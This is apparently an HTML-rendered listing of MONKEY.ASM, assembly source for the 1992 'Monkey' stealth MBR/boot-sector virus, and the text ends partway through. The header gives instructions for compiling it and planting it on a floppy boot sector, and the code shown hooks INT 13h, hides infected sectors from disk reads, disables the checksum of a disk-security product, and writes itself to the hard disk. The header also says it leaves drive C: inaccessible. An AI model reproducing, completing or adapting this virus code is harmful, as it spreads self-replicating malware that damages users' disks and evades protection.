<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MONKEY.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
       </span><span class="sc9">page</span><span class="sc0">    </span><span class="sc2">70</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
       </span><span class="sc9">Name</span><span class="sc0">    </span><span class="sc5">Monkey</span><span class="sc0">

</span><span class="sc1">;*******************************************************</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      Monkey written at the city of champions</span><span class="sc0">
</span><span class="sc1">;       - Edmonton - by UACVRS - Jan 1992.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Monkey is a full stealth MBR/Boot self-replicating program with</span><span class="sc0">
</span><span class="sc1">;     no payload but it does not save the HD's partition</span><span class="sc0">
</span><span class="sc1">;     table in place. When the "infected" computer is booted</span><span class="sc0">
</span><span class="sc1">;     from a floppy, c: drive will no longer be accessible.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     To compile: masm monkey     (we used MASM 5.0)</span><span class="sc0">
</span><span class="sc1">;                 link monkey</span><span class="sc0">
</span><span class="sc1">;                 exe2bin monkey.exe monkey.co</span><span class="sc0">
</span><span class="sc1">;     Use NU, or debug to copy monkey.co to the boot</span><span class="sc0">
</span><span class="sc1">;        sector of a floppy. The diskette will not boot</span><span class="sc0">
</span><span class="sc1">;        but will install itself on the hard drive.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     Bug: It will trash any floppies higher than</span><span class="sc0">
</span><span class="sc1">;          1.44meg, not deliberately.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;*******************************************************</span><span class="sc0">

</span><span class="sc5">Code</span><span class="sc0">   </span><span class="sc9">Segment</span><span class="sc0">
       </span><span class="sc9">Assume</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">CODE</span><span class="sc0">
       </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">00H</span><span class="sc0">

</span><span class="sc5">MAIN</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">INITIAL</span><span class="sc0">

</span><span class="sc1">; space above 1fh is for floppy format data</span><span class="sc0">

       </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">1FH</span><span class="sc0">
</span><span class="sc5">INT_13</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">

          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SET_HEAD</span><span class="sc0">

          </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">
          </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">END_ACTION</span><span class="sc0">

          </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
          </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">1AH</span><span class="sc0">

</span><span class="sc5">TIME</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">JNB</span><span class="sc0">     </span><span class="sc5">END_ACTION</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">HANDLE_DISK</span><span class="sc0">

</span><span class="sc5">END_ACTION</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc0">

          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">

          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">03H</span><span class="sc0">                 </span><span class="sc1">; YES, IS SECTOR LESS THAN 3?</span><span class="sc0">
          </span><span class="sc6">JNB</span><span class="sc0">   </span><span class="sc5">EXIT_2</span><span class="sc0">                 </span><span class="sc1">; NO, EXIT</span><span class="sc0">

          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Right head?</span><span class="sc0">
          </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">EXIT_2</span><span class="sc0">                 </span><span class="sc1">; NO, EXIT</span><span class="sc0">

          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">                 </span><span class="sc1">; READ ?</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">STEALTH</span><span class="sc0">                </span><span class="sc1">; YES, STEALTH</span><span class="sc0">

          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03H</span><span class="sc0">                 </span><span class="sc1">; WRITE ?</span><span class="sc0">
          </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">EXIT_2</span><span class="sc0">                 </span><span class="sc1">; NO, EXIT</span><span class="sc0">
                                       </span><span class="sc1">; YES!</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">                 </span><span class="sc1">; HARD DRIVE?</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">EXIT_2</span><span class="sc0">                 </span><span class="sc1">; NO, EXIT</span><span class="sc0">

          </span><span class="sc6">SUB</span><span class="sc0">   </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">            </span><span class="sc1">; else RESET DISK - make HD light blink</span><span class="sc0">
          </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">EXIT_2</span><span class="sc0">           </span><span class="sc1">; EXIT</span><span class="sc0">
</span><span class="sc5">STEALTH</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">INT13</span><span class="sc0">                  </span><span class="sc1">; READ</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">EXIT_3</span><span class="sc0">                 </span><span class="sc1">; ERROR?</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">COMP_SIG</span><span class="sc0">               </span><span class="sc1">; MY RELATIVE?</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">REDIRECT</span><span class="sc0">               </span><span class="sc1">; YES, REDIRECT</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">COMP_PA</span><span class="sc0">                </span><span class="sc1">; NO, IS IT PA?</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">REDIRECT</span><span class="sc0">               </span><span class="sc1">; YES, REDIRECT</span><span class="sc0">

</span><span class="sc5">EXIT_0</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">CLC</span><span class="sc0">                          </span><span class="sc1">; NO, RESET FLAG</span><span class="sc0">
          </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">EXIT_3</span><span class="sc0">           </span><span class="sc1">; EXIT</span><span class="sc0">

</span><span class="sc5">REDIRECT</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">CHSEC</span><span class="sc0">        </span><span class="sc1">; CALC. THE SECTOR TO HIDE &amp; PUT IN CL</span><span class="sc0">

          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; SET RIGHT HEAD</span><span class="sc0">

          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">                     </span><span class="sc1">; RESTORE AX</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">INT13</span><span class="sc0">                  </span><span class="sc1">; RE-READ</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">ENCRPT_PBR</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">                     </span><span class="sc1">; RESTORE CX, DX</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">EXIT_4</span><span class="sc0">           </span><span class="sc1">; EXIT</span><span class="sc0">
</span><span class="sc5">EXIT_2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">INT13</span><span class="sc0">
</span><span class="sc5">EXIT_3</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
</span><span class="sc5">EXIT_4</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">RETF</span><span class="sc0">  </span><span class="sc2">0002H</span><span class="sc0">

</span><span class="sc5">READ_SEC_1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0201H</span><span class="sc0">         </span><span class="sc1">; READ</span><span class="sc0">
</span><span class="sc5">INT13</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
          </span><span class="sc6">PUSHF</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">INT13_ADDR</span><span class="sc0">     </span><span class="sc1">;***********</span><span class="sc0">
          </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">INT13</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">HOOK_ENTRY</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
</span><span class="sc5">HOOK</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">INT</span><span class="sc0">   </span><span class="sc2">12H</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc2">004CH</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">HOME_SEC</span><span class="sc4">,</span><span class="sc2">02H</span><span class="sc0">       </span><span class="sc1">; I am in sector 2?</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">SETUP_SPECIAL</span><span class="sc0">

</span><span class="sc5">SETUP_NORMAL</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">SHIFT_NORMAL</span><span class="sc0">

          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT13_ADDR</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0002H</span><span class="sc0">
          </span><span class="sc6">CLD</span><span class="sc0">
          </span><span class="sc6">REPZ</span><span class="sc0">  </span><span class="sc6">MOVSW</span><span class="sc0">

          </span><span class="sc6">JMP</span><span class="sc0">   </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">STORE_SEGMENT</span><span class="sc0">

</span><span class="sc5">SETUP_SPECIAL</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">SHIFT_SPECIAL</span><span class="sc0">

</span><span class="sc5">STORE_SEGMENT</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">],</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">INT_13</span><span class="sc0">  </span><span class="sc1">; STORE MY ENTRY POINT</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">            </span><span class="sc1">; STORE MY SEGMENT</span><span class="sc0">

</span><span class="sc5">PATCH_OVER</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CS</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DS</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">PATCH</span><span class="sc0">           </span><span class="sc1">; PATCH OVER</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc0">              </span><span class="sc1">; PUSH SEGMENT</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">JMP_ADDR</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">; PUSH ADDRESS</span><span class="sc0">
          </span><span class="sc6">STI</span><span class="sc0">
          </span><span class="sc6">RETF</span><span class="sc0">                 </span><span class="sc1">; FAR JMP</span><span class="sc0">

    </span><span class="sc5">JMP_ADDR</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">THIS</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0">
</span><span class="sc5">BOOT</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">            </span><span class="sc1">; TO 0000:7C00</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; SAVE JMP SEGMENT</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">BX</span><span class="sc0">

          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0080H</span><span class="sc0">         </span><span class="sc1">; HANDLE C:</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">SET_HEAD</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">HANDLE_DISK</span><span class="sc0">

</span><span class="sc5">BOOT_SEC</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">05H</span><span class="sc0">           </span><span class="sc1">; FROM SECTOR 3   ????</span><span class="sc0">

</span><span class="sc5">BOOT_DISK</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">         </span><span class="sc1">; C:, HEAD 0      ????</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">READ_SEC_1</span><span class="sc0">      </span><span class="sc1">; INT 13</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">ENCRPT_PBR</span><span class="sc0">

          </span><span class="sc6">RETF</span><span class="sc0">

</span><span class="sc5">HANDLE_DISK</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">

          </span><span class="sc1">; *** READ SECTOR 1 ***</span><span class="sc0">
          </span><span class="sc6">SUB</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">INC</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">

          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; HEAD</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">READ_SEC_1</span><span class="sc0">      </span><span class="sc1">; INT 13</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">END_HANDLE_DISK</span><span class="sc0">          </span><span class="sc1">; ERROR -&gt; END</span><span class="sc0">

          </span><span class="sc1">; *** COMPARE ***</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">COMP_SIG</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">E_2</span><span class="sc0">                      </span><span class="sc1">; SAME -&gt; UPDATE MYSELF</span><span class="sc0">

          </span><span class="sc1">; *** PA?  ***</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">COMP_PA</span><span class="sc0">                  </span><span class="sc1">; Is it Pagett's disksec?</span><span class="sc0">
          </span><span class="sc6">JNZ</span><span class="sc0">   </span><span class="sc5">UPDATE_DISK</span><span class="sc0">              </span><span class="sc1">; NO</span><span class="sc0">

          </span><span class="sc1">; *** OK?  ***</span><span class="sc0">
          </span><span class="sc6">INC</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1FAH</span><span class="sc4">],</span><span class="sc2">00H</span><span class="sc0"> </span><span class="sc1">; when this byte in disksec is set</span><span class="sc0">
                                          </span><span class="sc1">; to 0 means disksec would not do</span><span class="sc0">
                                          </span><span class="sc1">; checksum of partitions - Pagett</span><span class="sc0">
                                          </span><span class="sc1">; sucks</span><span class="sc0">
          </span><span class="sc6">JZ</span><span class="sc0">    </span><span class="sc5">E_2</span><span class="sc0">                       </span><span class="sc1">; SAME -&gt; UPDATE MYSELF</span><span class="sc0">

          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">1FAH</span><span class="sc4">],</span><span class="sc2">00H</span><span class="sc0"> </span><span class="sc1">; set this to zero</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">1H</span><span class="sc0">                     </span><span class="sc1">; write the change back to sector 1</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">WRITE_SEC_1</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">END_HANDLE_DISK</span><span class="sc0">

          </span><span class="sc1">; *** YES! READ SECTOR 2  ***</span><span class="sc0">
          </span><span class="sc6">INC</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">              </span><span class="sc1">; yes,Pagette 's disksecure is on sector 1</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; My relative is on sector 2 - read sector 2</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">READ_SEC_1</span><span class="sc0">      </span><span class="sc1">; INT 13</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">END_HANDLE_DISK</span><span class="sc0"> </span><span class="sc1">; ERROR -&gt; END</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">

</span><span class="sc5">UPDATE_DISK</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">CHSEC</span><span class="sc0">        </span><span class="sc1">; CALC. THE SECTOR TO HIDE &amp; PUT IN CL</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">ENCRPT_PBR</span><span class="sc0">
          </span><span class="sc6">INC</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">WRITE_SEC_1</span><span class="sc0">
          </span><span class="sc6">DEC</span><span class="sc0">   </span><span class="sc8">SI</span><span class="sc0">
          </span><span class="sc6">JB</span><span class="sc0">    </span><span class="sc5">END_HANDLE_DISK</span><span class="sc0">

          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">ENCRPT_PBR</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">PATCH</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">

          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">CMP</span><span class="sc0">   </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">
          </span><span class="sc6">JNB</span><span class="sc0">   </span><span class="sc5">E_1</span><span class="sc0">
          </span><span class="sc6">XOR</span><span class="sc0">   </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
</span><span class="sc5">E_1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">BOOT_DISK</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">DX</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">BOOT_SEC</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">PUSH</span><span class="sc0">  </span><span class="sc8">CX</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">HOME_SEC</span><span class="sc4">],</span><span class="sc8">CL</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BOOT_SIG</span><span class="sc4">],</span><span class="sc2">0AA55H</span><span class="sc0">

</span><span class="sc5">E_2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">WRITE_SEC_1</span><span class="sc0">

</span><span class="sc5">END_HANDLE_DISK</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">POP</span><span class="sc0">   </span><span class="sc8">AX</span><span class="sc0">
          </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">HANDLE_DISK</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">WRITE_SEC_1</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0"> </span><span class="sc10">NEAR</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">WRITE_SEC_2</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">MOV</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0301H</span><span class="sc0">
          </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">INT13</span><span class="sc0">
          </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">WRITE_SEC_1</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

